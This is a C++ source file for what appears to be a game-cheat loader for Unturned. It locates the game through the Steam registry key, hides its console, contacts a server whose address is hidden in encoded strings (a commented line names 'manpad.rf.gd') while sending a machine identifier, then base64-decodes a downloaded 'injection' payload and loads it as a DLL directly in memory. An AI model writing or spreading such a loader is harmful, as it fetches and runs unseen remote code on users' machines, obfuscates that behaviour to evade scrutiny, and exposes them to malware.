#include "kCrypt.h"
#include "LoadDLL.h"

/*
BYTE* readFileBytes(const char* name, size_t* length)
{

	BYTE* buffer;
	FILE* fp = fopen(name, "rb");
	fseek(fp, 0, SEEK_END);
	*length = ftell(fp);
	rewind(fp);

	buffer = (BYTE*)malloc((*length + 1)*sizeof(BYTE));
	fread(buffer, *length, 1, fp);
	fclose(fp);

	return buffer;

}


void sendEncryptedToClip(char* c)
{
	setClipboard(("decryptString(\"" + encryptString(c) + "\").c_str()").c_str());
}*/

typedef LOAD_DLL_INFO* MODULE_HANDLE;

MODULE_HANDLE LoadModule(BYTE* data, size_t size)
{
	LOAD_DLL_INFO* p = new LOAD_DLL_INFO;
	DWORD res = LoadDLLFromMemory(data, size, 0, p);
	if (res != ELoadDLLResult_OK)
	{
		delete p;
		return NULL;
	}
	return p;
}

bool UnloadModule(MODULE_HANDLE handle)
{
	bool res = FALSE != UnloadDLL(handle);
	delete handle;
	return res;
}

void* GetModuleFunction(MODULE_HANDLE handle, const char* func_name)
{
	return (void*)myGetProcAddress_LoadDLLInfo(handle, func_name);
}

int main(int argc, char** args)
{
	
	//sendEncryptedToClip("manpad.rf.gd");
	//log("\"%s\"", "adsasd");
	//getchar();
	//return 0;

	HKEY res;
	RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Valve\\Steam", 0, KEY_READ, &res);

	CHAR rBuffer[512];
	DWORD bufSize = sizeof(rBuffer);
	RegQueryValueEx(res, "SteamPath", 0, NULL, (LPBYTE)rBuffer, &bufSize);
	std::string defaultSteam(rBuffer);
	std::string cfgPath(rBuffer);
	cfgPath += "/config/config.vdf";

	std::ifstream cfgFile(cfgPath.c_str());
	std::string installDir = "BaseInstallFolder";
	const size_t bif = installDir.length();

	while (std::getline(cfgFile, installDir))
	{

		if (installDir.find("BaseInstallFolder") != -1)
		{

			installDir = installDir.substr(installDir.find("BaseInstallFolder") + bif);
			installDir = installDir.substr(installDir.find("\"") + 1);
			installDir = installDir.substr(installDir.find("\"") + 1);
			removeString(installDir, "\"");
			installDir += "\\steamapps\\common\\Unturned\\Unturned.exe";

			if (std::ifstream(installDir.c_str()))
			{
				
				removeString(installDir, "Unturned.exe");
				log("Found Unturned: %s", installDir);

				if (!SetCurrentDirectory(installDir.c_str()))
					log("Failed to set Unturned dir!");

			}

		}

	}

	cfgFile.close();

	if (!std::ifstream("Unturned.exe"))
	{

		defaultSteam += "\\steamapps\\common\\Unturned\\Unturned.exe";

		if (std::ifstream(defaultSteam.c_str()))
		{

			removeString(defaultSteam, "Unturned.exe");
			log("Found Unturned: %s", defaultSteam);

			if (!SetCurrentDirectory(defaultSteam.c_str()))
				log("Failed to set Unturned dir!");

			if (!std::ifstream("Unturned.exe"))
			{

				MessageBox(NULL, "Failed to find Unturned!", "", 0);
				exit(0);

				return 0;

			}

		}
		else
		{

			MessageBox(NULL, "Failed to find Unturned!", "", 0);
			exit(0);

			return 0;

		}

	}

	FreeConsole();

	WSADATA wsaData = { 0 };
	int iResult = 0;
	iResult = WSAStartup(0x0202, &wsaData);
	SOCKET s = getSocket(std::string(getIP(decryptString("000000000111100100000000011011010000000001111010000000000111110000000000011011010000000001110000000000000011101000000000011111100000000001110010000000000011101000000000011100110000000001110000").c_str())).c_str(), 80);
	
	const int pSize = 2048 * 1024;
	std::vector<char> buffer(pSize); //Yes, this is a 2MB buffer, deal with it - We dont live in the stone ages anymore
	std::string pArgs = decryptString("0000000010000000000000001000000100000000011011100000000001110100000000000111001000000000010010100000000000111110000000000011001100000000010101010000000001100100000000000101011000000000010100010000000001001010").c_str();
	pArgs += getID().c_str();

	strcpy(buffer.data(), decryptString("0000000001101100000000000110101100000000011011110000000001110000000000000011110000000000010010110000000010000000000000001000101100000000100100110000000010001010000000001000100000000000100010110000000001111101000000001000000000000000010010100000000010001100000000001000010000000000100011000000000000111100000000000110010000000000011100000000000001110000000000000110110000000000010010110000000001001101000000000100101000000000010011010000000000100110").c_str());
	strcat(buffer.data(), decryptString("000000000111001100000000100111110000000010011110000000001010010000000000100101010000000010011110000000001010010000000000010111010000000010000100000000001010100100000000101000000000000010010101000000000110101000000000010100000000000010010001000000001010000000000000101000000000000010011100000000001001100100000000100100110000000010010001000000001010010000000000100110010000000010011111000000001001111000000000010111110000000010101000000000000101110100000000101001110000000010100111000000001010011100000000010111010000000010010110000000001001111100000000101000100000000010011101000000000101110100000000101001010000000010100010000000001001110000000000100101010000000010011110000000001001001100000000100111110000000010010100000000001001010100000000100101000000000000111010").c_str());
	strcat(buffer.data(), decryptString("0000000001011011000000001000001000000000100001100000000010000111000000000100110100000000001100110000000010000000000000000111010000000000100000010000000010000011000000000111010000000000011101110000000001000001000000001000010100000000011110010000000001000001000000000111101000000000011101110000000000011101").c_str());//Host
	strcat(buffer.data(), decryptString("0000000001010011000000000111111100000000011111100000000010000100000000000111010100000000011111100000000010000100000000000011110100000000010111000000000001110101000000000111111000000000011101110000000010000100000000000111100000000000010010100000000000110000").c_str());
	strcat(buffer.data(), std::to_string(pArgs.length()).c_str());
	strcat(buffer.data(), "\n\n");
	strcat(buffer.data(), pArgs.c_str());

	send(s, buffer.data(), strlen(buffer.data()), 0);

	std::string str = "";
	std::string line = "";
	size_t prevSize = 0;

	for (int i = 0; i < 9; i++)
		readSocketLine(s, false);

	while ((line = readSocketLine(s)) != "")
	{

		prevSize = line.length();

		if (prevSize > 5)
			str += line;

	}
	
	closesocket(s);

	std::string temp = "";

	for (size_t i = 0; i < str.length(); i++)
		if (str[i] != '\\')
			temp += str[i];

	str = temp;

	std::string success = str.substr(0, str.find("false") != -1 ? 5 : 4);
	str = str.substr(str.find("\":\"") + 3);
	std::string loader = str.substr(0, str.find("\",\""));
	str = str.substr(str.find("\":\"") + 3);
	std::string executor = str.substr(0, str.find("\",\""));
	str = str.substr(str.find("\":\"") + 3);
	std::string injection = str.substr(0, str.find("\"}"));

	std::vector<BYTE> vec3 = base64_decode(injection);;
	LoadModule(vec3.data(), vec3.size());

	return 0;

}